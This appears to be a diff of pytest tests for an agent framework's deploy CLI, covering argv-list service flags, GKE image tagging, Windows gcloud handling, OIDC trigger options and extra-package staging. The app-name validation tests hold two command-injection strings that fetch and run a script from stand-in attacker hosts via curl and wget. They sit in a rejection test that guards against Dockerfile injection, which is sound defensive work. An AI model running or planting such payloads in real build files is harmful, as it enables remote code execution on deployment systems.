@@ -17,7 +17,10 @@
 from __future__ import annotations
 
 import importlib
+import inspect
+import json
 from pathlib import Path
+import re
 import shutil
 import subprocess
 import sys
@@ -26,6 +29,7 @@ from typing import Any
 from typing import Callable
 from typing import Dict
 from typing import List
+from typing import Optional
 from typing import Tuple
 from unittest import mock
 
@@ -125,6 +129,7 @@ def test_resolve_project_from_gcloud_fails(
       "run",
       mock.Mock(side_effect=subprocess.CalledProcessError(1, "cmd", "err")),
   )
+
   with pytest.raises(subprocess.CalledProcessError):
     cli_deploy._resolve_project(None)
 
@@ -139,10 +144,11 @@ def test_resolve_project_from_gcloud_fails(
             "gs://a",
             "rag://m",
             None,
-            (
-                "--session_service_uri=sqlite://s --artifact_service_uri=gs://a"
-                " --memory_service_uri=rag://m"
-            ),
+            [
+                "--session_service_uri=sqlite://s",
+                "--artifact_service_uri=gs://a",
+                "--memory_service_uri=rag://m",
+            ],
         ),
         (
             "1.2.5",
@@ -150,10 +156,11 @@ def test_resolve_project_from_gcloud_fails(
             "gs://a",
             "rag://m",
             None,
-            (
-                "--session_service_uri=sqlite://s --artifact_service_uri=gs://a"
-                " --memory_service_uri=rag://m"
-            ),
+            [
+                "--session_service_uri=sqlite://s",
+                "--artifact_service_uri=gs://a",
+                "--memory_service_uri=rag://m",
+            ],
         ),
         (
             "0.5.0",
@@ -161,10 +168,11 @@ def test_resolve_project_from_gcloud_fails(
             "gs://a",
             "rag://m",
             None,
-            (
-                "--session_service_uri=sqlite://s --artifact_service_uri=gs://a"
-                " --memory_service_uri=rag://m"
-            ),
+            [
+                "--session_service_uri=sqlite://s",
+                "--artifact_service_uri=gs://a",
+                "--memory_service_uri=rag://m",
+            ],
         ),
         (
             "1.3.0",
@@ -172,7 +180,7 @@ def test_resolve_project_from_gcloud_fails(
             None,
             None,
             None,
-            "--session_service_uri=sqlite://s",
+            ["--session_service_uri=sqlite://s"],
         ),
         (
             "1.3.0",
@@ -180,7 +188,7 @@ def test_resolve_project_from_gcloud_fails(
             "gs://a",
             "rag://m",
             None,
-            "--artifact_service_uri=gs://a --memory_service_uri=rag://m",
+            ["--artifact_service_uri=gs://a", "--memory_service_uri=rag://m"],
         ),
         (
             "1.2.0",
@@ -188,7 +196,7 @@ def test_resolve_project_from_gcloud_fails(
             "gs://a",
             None,
             None,
-            "--artifact_service_uri=gs://a",
+            ["--artifact_service_uri=gs://a"],
         ),
         (
             "1.21.0",
@@ -196,7 +204,7 @@ def test_resolve_project_from_gcloud_fails(
             None,
             None,
             False,
-            "--no_use_local_storage",
+            ["--no_use_local_storage"],
         ),
         (
             "1.21.0",
@@ -204,7 +212,7 @@ def test_resolve_project_from_gcloud_fails(
             None,
             None,
             True,
-            "--use_local_storage",
+            ["--use_local_storage"],
         ),
         (
             "1.21.0",
@@ -212,27 +220,40 @@ def test_resolve_project_from_gcloud_fails(
             "gs://a",
             None,
             False,
-            "--session_service_uri=sqlite://s --artifact_service_uri=gs://a",
+            [
+                "--session_service_uri=sqlite://s",
+                "--artifact_service_uri=gs://a",
+            ],
+        ),
+        # A value containing a space stays one argv entry; joining into a
+        # single string would have word split it into two flags.
+        (
+            "1.3.0",
+            "sqlite:///tmp/my sessions.db",
+            None,
+            None,
+            None,
+            ["--session_service_uri=sqlite:///tmp/my sessions.db"],
         ),
     ],
 )
-def test_get_service_option_by_adk_version(
+def test_get_service_options_by_adk_version(
     adk_version: str,
     session_uri: str | None,
     artifact_uri: str | None,
     memory_uri: str | None,
     use_local_storage: bool | None,
-    expected: str,
+    expected: list[str],
 ) -> None:
   """It should return the correct service URI flags for a given ADK version."""
-  actual = cli_deploy._get_service_option_by_adk_version(
+  actual = cli_deploy._get_service_options_by_adk_version(
       adk_version=adk_version,
       session_uri=session_uri,
       artifact_uri=artifact_uri,
       memory_uri=memory_uri,
       use_local_storage=use_local_storage,
   )
-  assert actual.rstrip() == expected.rstrip()
+  assert actual == expected
 
 
 def test_print_agent_engine_url() -> None:
@@ -247,6 +268,19 @@ def test_print_agent_engine_url() -> None:
     assert "us-central1" in call_args
     assert "123456" in call_args
     assert "playground" in call_args
+
+
+def test_print_gemini_enterprise_hint() -> None:
+  """It should print a pointer to the Gemini Enterprise registration docs."""
+  with mock.patch("click.secho") as mocked_secho:
+    cli_deploy._print_gemini_enterprise_hint()
+    mocked_secho.assert_called_once()
+    call_args = mocked_secho.call_args[0][0]
+    assert "Gemini Enterprise" in call_args
+    assert (
+        "https://docs.cloud.google.com/gemini/enterprise/docs/register-and-manage-an-adk-agent"
+        in call_args
+    )
 
 
 @pytest.mark.parametrize("include_requirements", [True, False])
@@ -301,6 +335,13 @@ def test_to_agent_engine_happy_path(
   assert agent_file.is_file()
   assert len(create_recorder.calls) == 1
   assert str(rmtree_recorder.get_last_call_args()[0]) == str(tmp_dir)
+
+  requirements_file = tmp_dir / "agents" / "agent" / "requirements.txt"
+  assert requirements_file.is_file()
+  assert (
+      "google-cloud-aiplatform[adk,agent_engines]"
+      in requirements_file.read_text()
+  )
 
 
 def test_to_agent_engine_raises_when_explicit_config_file_missing(
@@ -378,18 +419,35 @@ def test_to_gke_happy_path(
   dockerfile_path = tmp_path / "Dockerfile"
   assert dockerfile_path.is_file()
   dockerfile_content = dockerfile_path.read_text()
-  assert "CMD adk api_server --with_ui --port=9090" in dockerfile_content
-  assert "RUN pip install google-adk==1.2.0" in dockerfile_content
+  assert (
+      'CMD ["adk", "api_server", "--with_ui", "--port=9090"'
+      in dockerfile_content
+  )
+  assert (
+      'RUN ["pip", "install", "google-adk[a2a]==1.2.0"]' in dockerfile_content
+  )
 
   assert len(run_recorder.calls) == 3, "Expected 3 subprocess calls"
 
   build_args = run_recorder.calls[0][0][0]
+  # The image is tagged uniquely per build. kubectl apply diffs the manifest,
+  # so reusing one floating tag leaves the Deployment spec unchanged and the
+  # freshly pushed image never rolls out.
+  image_ref = build_args[build_args.index("--tag") + 1]
+  image_name, _, image_tag = image_ref.partition(":")
+  assert image_name == "gcr.io/gke-proj/gke-svc"
+  assert re.fullmatch(r"\d{8}-\d{6}", image_tag), image_tag
+
   expected_build_args = [
-      "gcloud",
+      cli_deploy._GCLOUD_CMD,
       "builds",
       "submit",
       "--tag",
-      "gcr.io/gke-proj/gke-svc",
+      image_ref,
+      # Without --project the build runs in whatever project gcloud config
+      # points at, while the image is tagged for `project`.
+      "--project",
+      "gke-proj",
       "--verbosity",
       "debug",
       str(tmp_path),
@@ -398,7 +456,7 @@ def test_to_gke_happy_path(
 
   creds_args = run_recorder.calls[1][0][0]
   expected_creds_args = [
-      "gcloud",
+      cli_deploy._GCLOUD_CMD,
       "container",
       "clusters",
       "get-credentials",
@@ -424,18 +482,326 @@ def test_to_gke_happy_path(
   yaml_content = deployment_yaml_path.read_text()
 
   assert "kind: Deployment" in yaml_content
+  assert f"image: {image_ref}" in yaml_content
   assert "kind: Service" in yaml_content
   assert "name: gke-svc" in yaml_content
   assert "image: gcr.io/gke-proj/gke-svc" in yaml_content
   assert f"containerPort: 9090" in yaml_content
   assert f"targetPort: 9090" in yaml_content
   assert "type: ClusterIP" in yaml_content
+  assert "name: GOOGLE_GENAI_USE_ENTERPRISE" in yaml_content
+  assert 'value: "1"' in yaml_content
+  assert "name: GOOGLE_CLOUD_PROJECT" in yaml_content
+  assert 'value: "gke-proj"' in yaml_content
+  assert "name: GOOGLE_CLOUD_LOCATION" in yaml_content
+  assert 'value: "us-east1"' in yaml_content
 
   # 4. Verify cleanup
   assert str(rmtree_recorder.get_last_call_args()[0]) == str(tmp_path)
 
 
+def test_to_gke_without_region_omits_location(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  src_dir = agent_dir(False, False)
+  monkeypatch.setattr(
+      subprocess,
+      "run",
+      lambda *a, **k: types.SimpleNamespace(
+          stdout="deployment.apps/gke-svc created\nservice/gke-svc created"
+      ),
+  )
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+  cli_deploy.to_gke(
+      agent_folder=str(src_dir),
+      project="gke-proj",
+      region=None,
+      cluster_name="my-gke-cluster",
+      service_name="gke-svc",
+      app_name="agent",
+      temp_folder=str(tmp_path),
+      port=9090,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      log_level="debug",
+      adk_version="1.2.0",
+  )
+
+  deployment_yaml_path = tmp_path / "deployment.yaml"
+  assert deployment_yaml_path.is_file()
+  yaml_content = deployment_yaml_path.read_text()
+
+  assert "name: GOOGLE_GENAI_USE_ENTERPRISE" in yaml_content
+  assert 'value: "1"' in yaml_content
+  assert "name: GOOGLE_CLOUD_PROJECT" in yaml_content
+  assert 'value: "gke-proj"' in yaml_content
+  assert "GOOGLE_CLOUD_LOCATION" not in yaml_content
+
+
+def test_to_gke_uses_gcloud_cmd_on_windows(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """On Windows, `to_gke` must invoke gcloud via `_GCLOUD_CMD` (gcloud.cmd).
+
+  Regression test: the GKE deploy path spawns gcloud without a shell, so a bare
+  `gcloud` name is not resolved to the `gcloud.cmd` batch script on Windows and
+  the deploy fails. Both gcloud invocations must use `_GCLOUD_CMD`.
+  """
+  src_dir = agent_dir(False, False)
+  run_recorder = _Recorder()
+
+  monkeypatch.setattr(cli_deploy, "_GCLOUD_CMD", "gcloud.cmd")
+
+  def mock_subprocess_run(*args, **kwargs):
+    run_recorder(*args, **kwargs)
+    command_list = args[0]
+    if command_list and command_list[0:2] == ["kubectl", "apply"]:
+      return types.SimpleNamespace(stdout="deployment created\nservice created")
+    return None
+
+  monkeypatch.setattr(subprocess, "run", mock_subprocess_run)
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+
+  cli_deploy.to_gke(
+      agent_folder=str(src_dir),
+      project="gke-proj",
+      region="us-east1",
+      cluster_name="my-gke-cluster",
+      service_name="gke-svc",
+      app_name="agent",
+      temp_folder=str(tmp_path),
+      port=9090,
+      trace_to_cloud=False,
+      otel_to_cloud=False,
+      with_ui=False,
+      log_level="debug",
+      adk_version="1.2.0",
+  )
+
+  build_args = run_recorder.calls[0][0][0]
+  assert build_args[0] == "gcloud.cmd"
+  assert build_args[1:3] == ["builds", "submit"]
+
+  creds_args = run_recorder.calls[1][0][0]
+  assert creds_args[0] == "gcloud.cmd"
+  assert creds_args[1:4] == ["container", "clusters", "get-credentials"]
+
+
 # _validate_agent_import tests
+class TestValidateAppName:
+  """Tests for the _validate_app_name function and its deploy call sites."""
+
+  @pytest.mark.parametrize(
+      "app_name",
+      [
+          "ssr",
+          "my-agent",
+          "my_agent",
+          "agent2",
+          "A",
+          "a" * 63,
+          "my.agent",
+          "agent.v1",
+          "agent-1.0",
+          "agent_v1.0",
+          "_agent.1",
+          "-agent.1",
+          "v1.0.0",
+      ],
+  )
+  def test_accepts_plain_identifiers(self, app_name: str) -> None:
+    # Should not raise.
+    cli_deploy._validate_app_name(app_name)
+
+  @pytest.mark.parametrize(
+      "app_name",
+      [
+          # Breaks out of a Dockerfile instruction.
+          'myagent"\nRUN curl https://attacker.example/x.sh | sh\n#',
+          # Breaks out of the shell-form CMD.
+          "x ; wget http://attacker/c2 -O /tmp/c2 ; sh /tmp/c2 #",
+          # Quotes and spaces.
+          'a" "b',
+          "has space",
+          # Trailing newline (would pass regex $ without fullmatch).
+          "myagent\n",
+          # Empty and over-long.
+          "",
+          "a" * 64,
+          # Path traversal shape and dot-only/dot-prefix names.
+          "../evil",
+          ".",
+          "..",
+          ".git",
+      ],
+  )
+  def test_rejects_unsafe_names(self, app_name: str) -> None:
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy._validate_app_name(app_name)
+    assert "Invalid app name" in str(exc_info.value)
+
+  def test_to_cloud_run_validates_app_name_and_trailing_slash(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      agent_dir: Callable[[bool, bool], Path],
+      tmp_path: Path,
+  ) -> None:
+    src_dir = agent_dir(False, False)
+    monkeypatch.setattr(subprocess, "run", lambda *a, **k: None)
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_cloud_run(
+          agent_folder=str(src_dir),
+          project="proj",
+          region="us-central1",
+          service_name="svc",
+          app_name='myagent"\nRUN injection',
+          temp_folder=str(tmp_path),
+          port=8080,
+          trace_to_cloud=False,
+          otel_to_cloud=False,
+          with_ui=False,
+          log_level="info",
+          verbosity="info",
+          adk_version="1.3.0",
+      )
+    assert "Invalid app name" in str(exc_info.value)
+
+    # Trailing slash in agent_folder should resolve to valid app_name when app_name is empty.
+    cli_deploy.to_cloud_run(
+        agent_folder=str(src_dir) + "/",
+        project="proj",
+        region="us-central1",
+        service_name="svc",
+        app_name="",
+        temp_folder=str(tmp_path),
+        port=8080,
+        trace_to_cloud=False,
+        otel_to_cloud=False,
+        with_ui=False,
+        log_level="info",
+        verbosity="info",
+        adk_version="1.3.0",
+    )
+
+  def test_to_agent_engine_validates_app_name_and_trailing_slash(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      tmp_path: Path,
+  ) -> None:
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+    fake_vertexai = types.ModuleType("vertexai")
+
+    class _FakeAgentEngines:
+
+      def create(self, **kwargs: Any) -> Any:
+        return types.SimpleNamespace(
+            api_resource=types.SimpleNamespace(
+                name="projects/p/locations/l/reasoningEngines/e"
+            )
+        )
+
+      def update(self, *, name: str, config: Dict[str, Any]) -> None:
+        del name
+        del config
+
+    class _FakeVertexClient:
+
+      def __init__(self, *args: Any, **kwargs: Any) -> None:
+        self.agent_engines = _FakeAgentEngines()
+
+    fake_vertexai.Client = _FakeVertexClient
+    monkeypatch.setitem(sys.modules, "vertexai", fake_vertexai)
+
+    # Invalid folder name with space should fail validation.
+    invalid_dir = tmp_path / "invalid name"
+    invalid_dir.mkdir()
+    (invalid_dir / "agent.py").write_text("root_agent = 'dummy'\n")
+    (invalid_dir / "__init__.py").touch()
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_agent_engine(
+          agent_folder=str(invalid_dir),
+          temp_folder="tmp",
+          project="my-gcp-project",
+          region="us-central1",
+          adk_version="1.2.0",
+      )
+    assert "Invalid app name" in str(exc_info.value)
+
+    # Folder name with dots and trailing slash should succeed.
+    dotted_dir = tmp_path / "my.agent"
+    dotted_dir.mkdir()
+    (dotted_dir / "agent.py").write_text("root_agent = 'dummy'\n")
+    (dotted_dir / "__init__.py").touch()
+
+    cli_deploy.to_agent_engine(
+        agent_folder=str(dotted_dir) + "/",
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+    )
+
+  def test_to_gke_validates_app_name_and_trailing_slash(
+      self,
+      monkeypatch: pytest.MonkeyPatch,
+      agent_dir: Callable[[bool, bool], Path],
+      tmp_path: Path,
+  ) -> None:
+    src_dir = agent_dir(False, False)
+    monkeypatch.setattr(
+        subprocess,
+        "run",
+        lambda *a, **k: types.SimpleNamespace(
+            stdout="deployment created\nservice created"
+        ),
+    )
+    monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy.to_gke(
+          agent_folder=str(src_dir),
+          project="gke-proj",
+          region="us-east1",
+          cluster_name="my-gke-cluster",
+          service_name="gke-svc",
+          app_name="invalid name",
+          temp_folder=str(tmp_path),
+          port=9090,
+          trace_to_cloud=False,
+          otel_to_cloud=False,
+          with_ui=False,
+          log_level="debug",
+          adk_version="1.2.0",
+      )
+    assert "Invalid app name" in str(exc_info.value)
+
+    # Trailing slash in agent_folder should resolve to valid app_name when app_name is empty.
+    cli_deploy.to_gke(
+        agent_folder=str(src_dir) + "/",
+        project="gke-proj",
+        region="us-east1",
+        cluster_name="my-gke-cluster",
+        service_name="gke-svc",
+        app_name="",
+        temp_folder=str(tmp_path),
+        port=9090,
+        trace_to_cloud=False,
+        otel_to_cloud=False,
+        with_ui=False,
+        log_level="debug",
+        adk_version="1.2.0",
+    )
+
+
 class TestValidateAgentImport:
   """Tests for the _validate_agent_import function."""
 
@@ -487,6 +853,41 @@ class TestValidateAgentImport:
     # Should not raise
     cli_deploy._validate_agent_import(
         str(tmp_path), "app", is_config_agent=False
+    )
+
+  def test_validate_agent_import_with_stale_cache(
+      self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+  ) -> None:
+    """Should succeed even when parent dir contents were cached before agent package creation."""
+    import os
+    import sys
+
+    parent_dir = str(tmp_path)
+    # Populate sys.path_importer_cache before agent package directory exists
+    finder = None
+    for hook in sys.path_hooks:
+      try:
+        finder = hook(parent_dir)
+        if finder and hasattr(finder, "find_spec"):
+          finder.find_spec("non_existent_module")
+          break
+      except Exception:
+        pass
+
+    assert finder is not None
+    monkeypatch.setitem(sys.path_importer_cache, parent_dir, finder)
+
+    agent_dir = tmp_path / "new_agent_package"
+    agent_dir.mkdir()
+    (agent_dir / "__init__.py").touch()
+    (agent_dir / "agent.py").write_text("root_agent = 'stale_test'\n")
+
+    # Ensure finder has stale mtime cache so it requires invalidate_caches
+    assert hasattr(finder, "_path_mtime")
+    finder._path_mtime = os.stat(parent_dir).st_mtime
+
+    cli_deploy._validate_agent_import(
+        str(agent_dir), "root_agent", is_config_agent=False
     )
 
   def test_success_with_relative_imports(self, tmp_path: Path) -> None:
@@ -660,6 +1061,101 @@ def test_cli_deploy_agent_engine_trigger_sources(tmp_path: Path):
     assert kwargs["trigger_sources"] == "pubsub,eventarc"
 
 
+def test_cli_deploy_agent_engine_trigger_oidc_options(tmp_path: Path):
+  """Tests that OIDC flags are passed to to_agent_engine."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch(
+      "src.google.adk.cli.cli_deploy.to_agent_engine"
+  ) as mock_to_agent_engine:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "agent_engine",
+            "--trigger_sources=pubsub",
+            "--trigger_oidc_audience=https://my-service.run.app",
+            "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_to_agent_engine.assert_called_once()
+    _, kwargs = mock_to_agent_engine.call_args
+    assert kwargs["trigger_sources"] == "pubsub"
+    assert kwargs["trigger_oidc_audience"] == "https://my-service.run.app"
+    assert (
+        kwargs["trigger_oidc_service_accounts"]
+        == "sa@project.iam.gserviceaccount.com"
+    )
+
+
+def test_cli_deploy_cloud_run_trigger_oidc_options(tmp_path: Path):
+  """Tests that OIDC flags are passed to run."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch("src.google.adk.cli.cli_deploy.run") as mock_run:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "cloud_run",
+            "--project=my-project",
+            "--region=us-central1",
+            "--trigger_sources=pubsub,eventarc",
+            "--trigger_oidc_audience=https://my-service.run.app",
+            "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_run.assert_called_once()
+    _, kwargs = mock_run.call_args
+    assert kwargs["provider"] == "cloud_run"
+    assert kwargs["trigger_sources"] == "pubsub,eventarc"
+    assert kwargs["trigger_oidc_audience"] == "https://my-service.run.app"
+    assert (
+        kwargs["trigger_oidc_service_accounts"]
+        == "sa@project.iam.gserviceaccount.com"
+    )
+
+
+def test_cli_deploy_gke_trigger_oidc_options(tmp_path: Path):
+  """Tests that OIDC flags are passed to to_gke."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch("src.google.adk.cli.cli_deploy.to_gke") as mock_to_gke:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "gke",
+            "--project=my-project",
+            "--region=us-central1",
+            "--cluster_name=my-cluster",
+            "--trigger_sources=pubsub,eventarc",
+            "--trigger_oidc_audience=https://my-service.run.app",
+            "--trigger_oidc_service_accounts=sa@project.iam.gserviceaccount.com",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_to_gke.assert_called_once()
+    _, kwargs = mock_to_gke.call_args
+    assert kwargs["trigger_sources"] == "pubsub,eventarc"
+    assert kwargs["trigger_oidc_audience"] == "https://my-service.run.app"
+    assert (
+        kwargs["trigger_oidc_service_accounts"]
+        == "sa@project.iam.gserviceaccount.com"
+    )
+
+
 def test_cli_deploy_agent_engine_artifact_service_uri(tmp_path: Path):
   """Tests that --artifact_service_uri is passed to to_agent_engine."""
   agent_dir = tmp_path / "my_agent"
@@ -682,3 +1178,1064 @@ def test_cli_deploy_agent_engine_artifact_service_uri(tmp_path: Path):
     mock_to_agent_engine.assert_called_once()
     _, kwargs = mock_to_agent_engine.call_args
     assert kwargs["artifact_service_uri"] == "gs://my-bucket"
+
+
+def test_ensure_agent_engine_dependency(tmp_path: Path):
+  """Tests that _ensure_agent_engine_dependency appends correct extras."""
+  requirements_file = tmp_path / "requirements.txt"
+
+  # Case 1: raises FileNotFoundError when the file doesn't exist
+  with pytest.raises(FileNotFoundError):
+    cli_deploy._ensure_agent_engine_dependency(str(requirements_file))
+
+  # Case 2: appends google-cloud-aiplatform with 'adk' and 'agent_engines'
+  # extras and the versioned google-adk requirement.
+  requirements_file.write_text("")
+  cli_deploy._ensure_agent_engine_dependency(str(requirements_file))
+  content = requirements_file.read_text()
+  assert "google-cloud-aiplatform[adk,agent_engines]\n" in content
+  assert f"google-adk[a2a]=={cli_deploy.__version__}\n" in content
+
+  # Case 3: does not append duplicate if google-cloud-aiplatform already exists
+  requirements_file.write_text("google-cloud-aiplatform[adk,agent_engines]\n")
+  cli_deploy._ensure_agent_engine_dependency(str(requirements_file))
+  content = requirements_file.read_text()
+  assert content == "google-cloud-aiplatform[adk,agent_engines]\n"
+
+
+def _make_recording_vertexai(
+    captured_configs: List[Dict[str, Any]],
+    created_instances: Optional[List[Any]] = None,
+) -> types.ModuleType:
+  """Returns a fake `vertexai` module whose client records deploy configs."""
+  fake_vertexai = types.ModuleType("vertexai")
+
+  class _FakeAgentEngines:
+
+    def create(self, **kwargs: Any) -> Any:
+      if created_instances is not None:
+        created_instances.append(kwargs)
+      return types.SimpleNamespace(
+          api_resource=types.SimpleNamespace(
+              name="projects/p/locations/l/reasoningEngines/e"
+          )
+      )
+
+    def update(self, *, name: str, config: Dict[str, Any]) -> None:
+      del name
+      captured_configs.append(config)
+
+    def delete(self, *, name: str) -> None:
+      del name
+
+  class _FakeVertexClient:
+
+    def __init__(self, *args: Any, **kwargs: Any) -> None:
+      del args
+      del kwargs
+      self.agent_engines = _FakeAgentEngines()
+
+  fake_vertexai.Client = _FakeVertexClient
+  return fake_vertexai
+
+
+def test_to_agent_engine_with_extra_packages_adds_to_source_packages(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """extra_packages basenames should be appended to source_packages."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  extra_pkg = src_dir.parent / "my_extra_pkg"
+  extra_pkg.mkdir()
+  (extra_pkg / "helper.py").write_text("VALUE = 1\n")
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      extra_packages=[str(extra_pkg)],
+  )
+
+  assert len(captured) == 1
+  source_packages = captured[0]["source_packages"]
+  assert "agents/agent" in source_packages
+  assert "Dockerfile" in source_packages
+  assert "my_extra_pkg" in source_packages
+
+
+def test_to_agent_engine_with_extra_packages_copies_into_temp_and_dockerfile(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """extra_packages should be staged into the temp folder and copied in Docker."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  tmp_dir = src_dir.parent / "tmp"
+  extra_pkg = src_dir.parent / "my_extra_pkg"
+  extra_pkg.mkdir()
+  (extra_pkg / "helper.py").write_text("VALUE = 1\n")
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      extra_packages=[str(extra_pkg)],
+  )
+
+  assert (tmp_dir / "my_extra_pkg" / "helper.py").is_file()
+  dockerfile_content = (tmp_dir / "Dockerfile").read_text()
+  assert (
+      'COPY --chown=myuser:myuser "my_extra_pkg/" "/app/my_extra_pkg/"'
+      in dockerfile_content
+  )
+  assert 'ENV PYTHONPATH="/app:$PYTHONPATH"' in dockerfile_content
+
+
+def test_to_agent_engine_extra_packages_missing_path_raises(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """A nonexistent extra_packages path should raise a ClickException."""
+  monkeypatch.setattr(shutil, "rmtree", lambda *a, **k: None)
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  missing = tmp_path / "does_not_exist"
+
+  with pytest.raises(click.ClickException) as exc_info:
+    cli_deploy.to_agent_engine(
+        agent_folder=str(src_dir),
+        temp_folder="tmp",
+        project="my-gcp-project",
+        region="us-central1",
+        adk_version="1.2.0",
+        extra_packages=[str(missing)],
+    )
+
+  assert "extra_packages path not found" in str(exc_info.value)
+
+
+def test_to_agent_engine_extra_packages_from_config_file(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """The config-file `extra_packages` key should stage without being forwarded."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  extra_pkg = src_dir.parent / "cfg_pkg"
+  extra_pkg.mkdir()
+  (extra_pkg / "helper.py").write_text("VALUE = 1\n")
+  config_file = src_dir.parent / "config.json"
+  config_file.write_text(json.dumps({"extra_packages": [str(extra_pkg)]}))
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      agent_engine_config_file=str(config_file),
+  )
+
+  assert len(captured) == 1
+  config = captured[0]
+  assert "cfg_pkg" in config["source_packages"]
+  assert "extra_packages" not in config
+
+
+def test_to_agent_engine_config_file_relative_entry_resolves_to_agent_folder(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """Relative config-file entries resolve against the agent folder, not cwd."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  extra_pkg = src_dir / "local_pkg"
+  extra_pkg.mkdir()
+  (extra_pkg / "helper.py").write_text("VALUE = 1\n")
+  config_file = src_dir / ".agent_engine_config.json"
+  config_file.write_text(json.dumps({"extra_packages": ["local_pkg"]}))
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+  )
+
+  assert len(captured) == 1
+  assert "local_pkg" in captured[0]["source_packages"]
+
+
+def test_cli_deploy_agent_engine_passes_extra_packages(tmp_path: Path) -> None:
+  """Repeatable --extra_packages should reach to_agent_engine as a list."""
+  agent_dir = tmp_path / "my_agent"
+  agent_dir.mkdir()
+  runner = CliRunner()
+  with mock.patch(
+      "src.google.adk.cli.cli_deploy.to_agent_engine"
+  ) as mock_to_agent_engine:
+    result = runner.invoke(
+        cli_tools_click.main,
+        [
+            "deploy",
+            "agent_engine",
+            "--extra_packages=pkg_a",
+            "--extra_packages=pkg_b",
+            str(agent_dir),
+        ],
+        catch_exceptions=False,
+    )
+    assert result.exit_code == 0
+    mock_to_agent_engine.assert_called_once()
+    _, kwargs = mock_to_agent_engine.call_args
+    assert kwargs["extra_packages"] == ["pkg_a", "pkg_b"]
+
+
+def test_to_agent_engine_extra_packages_single_file_uses_file_form_copy(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """A single-file extra package is staged and copied with the file-form COPY."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  captured: List[Dict[str, Any]] = []
+  monkeypatch.setitem(
+      sys.modules, "vertexai", _make_recording_vertexai(captured)
+  )
+  src_dir = agent_dir(False, False)
+  tmp_dir = src_dir.parent / "tmp"
+  extra_file = src_dir.parent / "my_helper.py"
+  extra_file.write_text("VALUE = 1\n")
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      extra_packages=[str(extra_file)],
+  )
+
